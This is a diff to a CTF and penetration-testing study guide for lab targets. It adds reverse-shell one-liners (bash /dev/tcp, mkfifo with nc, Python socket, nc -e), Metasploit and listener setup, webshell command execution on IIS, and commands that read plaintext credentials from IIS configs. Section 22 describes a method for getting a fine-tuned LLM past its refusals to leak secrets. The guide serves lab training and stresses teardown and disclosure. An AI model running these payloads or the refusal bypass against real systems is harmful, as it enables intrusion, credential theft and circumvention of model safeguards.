@@ -124,8 +124,10 @@ curl -s -o /dev/null -w '%{http_code}:%{size_download}:%{redirect_url}\n' -H "Ho
 In ffuf, either keep the 302s and read them, or filter on the bounce URL instead of the code:
 ```bash
 ffuf ... -mc all -fr 'http://<domain>/?$'      # -fr = filter by regex on the response
-ffuf ... -L                                     # or follow redirects so the bodies really differ
+ffuf ... -r                                     # or follow redirects so the bodies really differ
 ```
+> Follow-redirects is `-r` in **ffuf** and **gobuster**, but `-L` in **curl**. Same idea, three
+> different letters — ffuf silently rejects `-L`.
 
 > **The rule:** a baseline is only as good as the field you compare. Status and size are the
 > defaults because they are convenient, not because they are sufficient. When a sweep finds
@@ -365,8 +367,9 @@ Removed lines (the `-` side of the diff) still contain the old value. **Git hist
 **Automated secret scanning (what pros run):**
 ```bash
 trufflehog github --repo=https://github.com/<owner>/<repo>
-gitleaks detect --source=<local-clone> -v
+gitleaks detect --source=<local-clone> -v      # gitleaks >= 8.19: prefer `gitleaks git <dir>`
 ```
+Neither ships with Kali by default — `sudo apt install trufflehog gitleaks` first.
 
 ---
 
@@ -541,24 +544,168 @@ mysql -u <user> -p'<pass>' <db> -e 'select * from users;'
 
 ---
 
-## 11. Shell upgrade & pivots (post-exploitation quick refs)
+## 11. Getting a shell — the channel, then the payload
 
-**Spawn a proper TTY from a dumb shell:**
+You have code execution on the target. Now you need a way to *talk* to it. Beginners jump straight
+to a payload one-liner off a cheat-sheet, it fails silently, and they conclude the exploit didn't
+work. Nine times out of ten the exploit worked fine and the **channel** was wrong. So pick the
+channel first, and prove it can carry traffic before you blame anything else.
+
+### 11.1 The three channels, in plain words
+
+| Channel | Who dials whom | Needs |
+|---|---|---|
+| **Reverse shell** | the *target* connects out to *you* | target egress allowed **and** your inbound port open |
+| **Bind shell** | *you* connect in to a port the target opened | that port reachable from you — usually **not**, a firewall sits in front |
+| **Webshell polling** | *you* send commands to the target's **own** web port | nothing extra — you already reach that port, it's how you got RCE |
+
+"Egress" = traffic leaving the target outwards. "Inbound" = traffic arriving at your machine.
+
+**Default to the webshell** on a locked-down target. Its success signal comes back in the HTTP
+response you were already reading, so it needs no inbound reachability, no firewall exception on
+your box, and no outbound rule on theirs. Reverse shells are nicer to use (a real prompt, tab
+completion) — take one when the channel is proven, not on faith.
+
+A bind shell is genuinely dead when only 80/443/3389 are reachable: you have nowhere to connect to.
+
+### 11.2 Your own firewall is part of the channel
+
+Kali ships with `ufw` (Uncomplicated Firewall). If it drops the target's callback, the reverse shell
+never appears and the exploit looks broken. This cost two hours and a wrong conclusion once, then
+nearly did it again on the next box, so read this twice.
+
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'    # then: Ctrl+Z, stty raw -echo, fg, enter
+sudo ufw status verbose        # THE ANSWER: the actual rule list
+sudo iptables-save             # same thing at the raw layer, if ufw isn't in use
 ```
-**Reverse shell (attacker listens, target connects back):**
+
+The trap: `/etc/default/ufw` contains `DEFAULT_INPUT_POLICY="DROP"`. That is the **fallback** — what
+happens to a packet *no rule matched*. It is not the verdict. On this very box the default was
+`deny (incoming)` while explicit rules allowed `80/tcp on tun0` and `31400:31409/tcp`. A callback to
+port 80 would have sailed through; only the reflex port 4444 was blocked. Reading the default policy
+and declaring "callbacks are blocked" inverted the truth.
+
+**Rule: list the rules. Never infer channel behaviour from the default policy.**
+
+`ufw status` needs root, and it is deliberately *not* in the passwordless-sudo allowlist here, so
+run it yourself in a terminal — an agent can't read it for you without your password.
+
+**The self-test that proves nothing:**
 ```bash
-# on attacker
-nc -lvnp <port>                # -l listen, -v verbose, -n no DNS, -p port
-# on target
-bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
+curl http://<your-tun0-ip>:80/     # ← useless as a firewall check
 ```
-**Serve/transfer files:**
+Traffic from your box to its own address goes over the loopback interface `lo`, which ufw always
+accepts. It never touches the rules that will decide the victim's packet. **A channel test must
+enter through the same interface the victim will use** (`tun0` for a VPN lab). If you can't generate
+that traffic yourself, read the rules directly.
+
+**Blocked packets are evidence, not silence:**
 ```bash
-python3 -m http.server <port>            # quick web server in current dir
-wget http://<attacker-ip>:<port>/file    # pull to target
-curl http://<attacker-ip>:<port>/file -o file
+sudo dmesg | grep 'UFW BLOCK'      # or: journalctl -k | grep 'UFW BLOCK'
+```
+A `UFW BLOCK ... SRC=<target-ip> DPT=4444` line is *positive proof your exploit fired* — the target
+did call back, your own machine hung up. That flips "the room is broken" into "open the port".
+
+```bash
+sudo ufw allow in on tun0 to any port 443 proto tcp   # open one port, one interface
+```
+
+### 11.3 Picking the port
+
+| Port | Why |
+|---|---|
+| **80 / 443** | almost always allowed outbound from a target (it's "just web"), and already open inbound on a lab-tuned ruleset. **443 is the best default** — egress filters see TLS-shaped traffic on the port TLS lives on |
+| **31400-31409** | the TryHackMe convention; some rooms whitelist exactly these |
+| **4444** | Metasploit's default, everyone's reflex, and the first thing an egress filter blocks. Change it |
+
+Ports below 1024 are "privileged" — normally only root may bind (listen on) them. Check whether your
+kernel still enforces that:
+```bash
+sysctl net.ipv4.ip_unprivileged_port_start
+# 1024 → you need sudo (or setcap) to listen on 80/443
+#    0 → any user can bind any port; no sudo needed  ← the case on this box
+```
+
+**Metasploit gotcha:** with `LPORT 80` the framework may still start its own handler on 4444, or
+collide with a listener you already have. Point it at the right port *and* the right source address:
+```
+set LHOST <your-tun0-ip>      # NOT your LAN IP — the target routes back over the VPN
+set LPORT 443
+set payload windows/x64/meterpreter/reverse_https
+set DisablePayloadHandler true   # when you're catching the shell with your own listener
+```
+
+### 11.4 Listeners
+
+```bash
+nc -lvnp 443                   # -l listen, -v verbose, -n no DNS lookups, -p port
+rlwrap nc -lvnp 443            # same, wrapped so arrow keys and history work in the caught shell
+```
+`rlwrap` is not installed by default — `sudo apt install rlwrap`. It costs nothing and turns an
+unusable shell (no backspace, no history, Ctrl-C kills the session) into a workable one.
+
+Then **verify the listener is actually bound** — "the command didn't error" is not the check:
+```bash
+ss -ltnp | grep :443           # -l listening, -t TCP, -n numeric, -p owning process
+```
+
+**Penelope** (`~/catch` here) is a smarter listener: it upgrades the caught shell to a full TTY by
+itself, survives disconnects, handles several sessions at once, and prints ready-made payloads for
+its own listener.
+```bash
+./catch          # listen on tun0:443
+./catch 80       # same, on port 80
+```
+Two things learned the hard way: the Kali apt package (0.21.0) is too old for the `--mcp` flag —
+fetch the current standalone script — and **the port must be given with `-p`**. A bare positional
+port is silently ignored and Penelope falls back to 4444, which is exactly the port your firewall
+drops.
+```bash
+penelope -p 443 -i <your-tun0-ip> --mcp    # -p port, -i bind address, --mcp expose the control API
+```
+
+### 11.5 Payload one-liners (run these ON the target)
+
+```bash
+bash -i >& /dev/tcp/<your-ip>/<port> 0>&1      # /dev/tcp is a bash feature, no nc needed
+```
+`-i` = interactive, `>&` = send both stdout and stderr down the socket, `0>&1` = read stdin from it
+too. That's the whole trick: three redirections onto a TCP file descriptor.
+
+**`/dev/tcp` is not a real device file — it is bash pretending.** It does not exist on disk, and
+shells that aren't bash have never heard of it. On Debian and Ubuntu `/bin/sh` is `dash`, where the
+same line dies with `cannot create /dev/tcp/...: Directory nonexistent`. So always invoke `bash`
+by name, and when the target genuinely has no bash, fall back to a tool that speaks TCP itself:
+
+```bash
+mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <your-ip> <port> > /tmp/f     # any POSIX shell + nc
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<your-ip>",<port>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'
+nc <your-ip> <port> -e /bin/sh                                            # ONLY if this nc has -e
+```
+Both of the first two are verified working against a local `nc -lvnp` listener.
+
+The `mkfifo` one is the portable choice: a named pipe (`mkfifo` makes a file that behaves like a
+pipe) loops the shell's output back into `nc`, which is how you get two-way traffic out of a tool
+that only does one direction. It needs no bash and no Python.
+
+**Check which `nc` before reaching for `-e`.** There are two common netcats and they are not
+interchangeable: `netcat-traditional` has `-e <program>`, `netcat-openbsd` — the default on Debian
+and Ubuntu — deliberately removed it. `nc -h 2>&1 | grep -e '-e'` settles it in one command.
+
+### 11.6 Upgrade a dumb shell to a real terminal
+
+A raw reverse shell has no job control, no tab completion, and dies if you press Ctrl-C.
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'   # then: Ctrl+Z, stty raw -echo, fg, Enter
+export TERM=xterm                                  # makes less/vim/clear behave
+```
+
+### 11.7 Serve and transfer files
+
+```bash
+python3 -m http.server <port>            # a web server for the current directory, one command
+wget http://<your-ip>:<port>/file        # pull to target
+curl http://<your-ip>:<port>/file -o file
 ```
 
 ---
@@ -575,7 +722,9 @@ curl http://<attacker-ip>:<port>/file -o file
 3. OSINT        pivot on a UNIQUE STRING → GitHub/dorks/paste sites → leaked secrets
 4. EXPLOIT      cross a trust boundary: leaked cred, injection, traversal, upload, auth flaw
                 app silent? attack the MIDDLEWARE, not the handler — malformed JSON (§16.5)
-5. POST-EXPLOIT got file read? get a LISTING first (.git/index, /proc, syslog — §17)
+5. POST-EXPLOIT pick the CHANNEL before the payload: webshell polling by default, reverse shell
+                only once your own ufw rules are read and the port is proven open (§11.1-11.3)
+                got file read? get a LISTING first (.git/index, /proc, syslog — §17)
                 read configs+source, dump DBs, crack hashes, escalate user→admin→root
                 shell? find / -perm -4000 and check what ISN'T stock (§19)
 6. VERIFY       confirm each finding a 2nd way; separate VERIFIED from ASSUMED; keep dead ends
@@ -1231,7 +1380,8 @@ grep -rlaE "<fragment>" / --binary-files=text 2>/dev/null   # then locate the on
 | `--exclude-dir` | skip virtual filesystems and 40k kernel headers |
 
 **A filename can be obfuscated (`.b0nus.fl4g`); the answer format cannot.** Search for what the
-author could not change.
+author could not change. The Windows equivalent — and the extension filter that hides a third of
+the flags — is in §21.5.
 
 ### 20.2 Put the box back
 
@@ -1249,7 +1399,139 @@ ssh -i <yourkey> -o BatchMode=yes root@$IP 'id'   # must be: Permission denied (
 ```
 Remove your root access **last**. In an engagement, unremoved tooling is a finding against you.
 
-### Quick habits that save time in the exam
+---
+
+## 21. Windows targets (IIS, Exchange, webshells)
+
+Everything above assumes Linux. A Windows box changes the commands but not the method. These are the
+parts that bite hardest coming from Linux.
+
+### 21.1 Fingerprint the build to the LAST octet before picking a CVE
+
+A "CVE" is a numbered, publicly-known vulnerability. Whether a given CVE applies usually comes down
+to a single digit at the end of a version string, because Microsoft ships security fixes as small
+increments on top of a Cumulative Update (CU).
+
+```bash
+curl -sk https://$IP/owa/auth/logon.aspx | grep -oE '/owa/auth/[0-9.]+/'
+#   → /owa/auth/15.2.858/     three octets, NOT enough to decide
+curl -sk https://$IP/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
+#   → <assemblyIdentity version="15.2.858.2" ...>     four octets, and no login required
+```
+`15.2.858` is Exchange 2019 CU9 (CU8 would be `15.2.792` — the CU number is not in the string, you
+look it up). The fourth octet decides everything: ProxyLogon was fixed in `.858.5`, ProxyShell in
+`.858.15`. A base `.858.2` is below both. Guessing the CU from three octets is how you burn an hour
+on a patched target — or skip a vulnerable one.
+
+That ClickOnce manifest under `/ecp/Current/exporttool/` is served **without authentication**. Cheap,
+unauthenticated, exact. Look for the equivalent on any product: a manifest, a `.js` bundle with a
+build hash, an error page footer.
+
+### 21.2 Run commands through a webshell you poll
+
+A webshell is a small script you drop into the target's own web root; you then send it commands over
+HTTP and read the answer in the response. No callback, no firewall involvement.
+
+```bash
+# send a command (URL-encode it), read the output straight back
+curl -sk "https://$IP/path/shell.aspx?cmd=whoami"
+```
+
+**Send long commands over POST, not GET.** IIS caps the length of a request URL, and past the cap it
+returns a generic error page instead of running your command — which looks exactly like a dead
+shell. A base64 PowerShell blob or a file-write blows through that cap immediately.
+```bash
+curl -sk -X POST https://$IP/path/shell.aspx --data-urlencode "cmd=powershell -enc <long-blob>"
+```
+`Request.Item["cmd"]` in classic ASP.NET reads GET *and* POST, so the same shell handles both. Use
+`--data-urlencode` so `+`, `&` and `=` inside the payload survive the trip.
+
+### 21.3 Background work must outlive the request
+
+Each webshell request is its own short-lived PowerShell process. `Start-Job` creates a *child* of
+that process, so when the request finishes the job is killed and its output file never appears — a
+long scan seems to hang forever.
+
+```powershell
+# WRONG through a one-shot webshell: dies with the request
+Start-Job { Get-ChildItem C:\ -Recurse }
+
+# RIGHT: a genuinely detached process that writes to a file you poll afterwards
+Start-Process -WindowStyle Hidden powershell -ArgumentList '-file','C:\Windows\Temp\s.ps1'
+```
+Then fetch `C:\Windows\Temp\out.txt` through the shell every so often until it stops growing.
+
+### 21.4 Where Windows keeps plaintext credentials
+
+```powershell
+# IIS application pool identities — passwords stored in cleartext in the config
+Get-Content C:\Windows\System32\inetsrv\config\applicationHost.config | Select-String "password"
+C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*      # same data, decrypted for you
+
+whoami /all                    # your user, groups, and PRIVILEGES (SeImpersonate → likely local system)
+Get-ChildItem C:\inetpub\wwwroot -Recurse -Include web.config | Select-String "connectionString"
+```
+An app pool running as a privileged account with its password sitting in `applicationHost.config` is
+a complete privilege-escalation path in one file read.
+
+### 21.5 Find flags by format — and watch the extension filter
+
+```powershell
+Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue |
+  Select-String -Pattern 'THM\{' -ErrorAction SilentlyContinue |
+  Select-Object Path, Line
+```
+Two cmdlets, because **`Select-String` cannot recurse** — it has no `-Recurse` parameter, and
+`-Path C:\` on its own searches nothing. `Get-ChildItem -Recurse` is what walks the tree; the pipe
+hands each file to `Select-String`, which searches file *contents*. `-File` skips directory
+entries, and `-ErrorAction SilentlyContinue` swallows the thousands of access-denied errors that
+would otherwise drown the output. (`grep -r` does both jobs in one tool; PowerShell splits them.)
+
+The trap: everyone adds `-Include *.txt,*.log,*.xml` to make it finish this century. On one box that
+returned 2 of 3 flags — the third was a literal inside `<asp:Label>` in
+`C:\inetpub\wwwroot\devel\default.aspx`, and `.aspx` wasn't in the list. **When a content search
+returns fewer hits than there are flags, suspect your own filter before you suspect the target.**
+Same lesson as "a sweep that finds nothing is a wordlist assumption", wearing a Windows costume.
+
+### 21.6 Teardown on a shared lab box
+
+Remove only what you can **prove** is yours. On one heavily-used room there were 13+ identical
+`Mailbox Import Export-Administrator-N` role assignments left by previous players; deleting "the"
+one you added is not possible when you cannot tell them apart. Delete your export requests, drafts,
+webshells and temp files — verify each — then **disclose the residual you left behind** rather than
+destroying another player's state.
+
+---
+
+## 22. Offline-first attacks (crypto oracles, AI CTFs)
+
+Some challenges are pure computation. The network is only where you *submit* the answer, so build
+and test locally first — a lab that goes down mid-session then costs you nothing.
+
+**Crypto (padding oracles, AES-CBC bit-flipping, weak tokens):** if you have the server's source,
+copy its exact primitives (`encrypt_data`, `decrypt_data`, whatever it calls them) into a local
+script and prove your forged ciphertext decrypts to the target plaintext **before** sending a single
+byte. That validator also becomes the evidence file a reader can re-run years later when the room is
+gone. Quote live server output from a redirected log (`script.py | tee evidence/run.log`), never
+from memory — a transcript that exists only in a terminal you closed is not evidence.
+
+**Extracting secrets from a fine-tuned LLM:** the refusal is usually keyed to the *chat template*
+(`<|im_start|>user … <|im_end|>`), not to what you asked. So stop chatting.
+
+| Move | Why |
+|---|---|
+| plain-text continuation of the model's own system-prompt opener | side-steps the template the safety tuning is attached to |
+| `temperature=1.5-1.6`, `min_new_tokens=15-20` | greedy decoding (`do_sample=False`) picks the refusal token every time; you need the distribution widened |
+| 20-30 seeds per prompt | one leak is noise. **Two independent seeds producing the same suffix** is the kill condition |
+| append every sample to a log file inside the loop | a 30-minute silent loop is indistinguishable from a hang, and you will kill it early |
+
+And check the arithmetic before calling a file suspicious: `params × bytes-per-param = size`. A
+1.9 GB safetensors for a 0.5 B model is `494M × 4 B = 1.84 GiB` of fp32 weights, not hidden data.
+A "hint" endpoint that answers `HINT{NOT-THE-FLAG}` is a decoy — the format mismatch is the tell.
+
+---
+
+## 23. Quick habits that save time in the exam
 - `export IP=...` once; reuse `$IP` everywhere.
 - Always run **one** `nmap -p-` — never trust the default top-1000.
 - On any HTTPS lab box, curl needs `-sk`.
@@ -1275,4 +1557,17 @@ Remove your root access **last**. In an engagement, unremoved tooling is a findi
 - Check you can **reach** an upload directory before crafting a payload for it.
 - With a shell: `find / -perm -4000 -type f` and ask which entries the package manager doesn't own.
 - With root: grep for the flag **format**, not the filename — `.b0nus.fl4g` beats `find -name "*flag*"`.
+- **List the firewall rules; never infer from the default policy.** `sudo ufw status verbose` is the
+  answer. `DEFAULT_INPUT_POLICY=DROP` in `/etc/default/ufw` is only what happens when *no rule
+  matched* — and the allow rules inverted that verdict twice (§11.2).
+- A localhost `curl` to your own IP tests nothing: it goes over `lo`, which the firewall always
+  accepts. **A channel test has to enter through the interface the victim will use.**
+- No callback? Read `dmesg | grep 'UFW BLOCK'` before you rebuild the payload. A blocked SYN from the
+  target's IP is proof your exploit fired.
+- Reverse shells go to **443 or 80**, not 4444. And check `-p` actually took: a listener silently
+  bound to the wrong port looks identical to a dead exploit.
+- Prefer a success signal you can read **through the app itself** — a webshell response, a value
+  written back into a page you can load. Same-origin channels are immune to both firewalls.
+- Pin the build to the **fourth** octet before you pick a CVE (§21.1).
 - Remove every shell, key and temp file you created, then **prove** your access is gone.
+- On a shared box, remove only what you can prove is yours — and disclose what you had to leave.
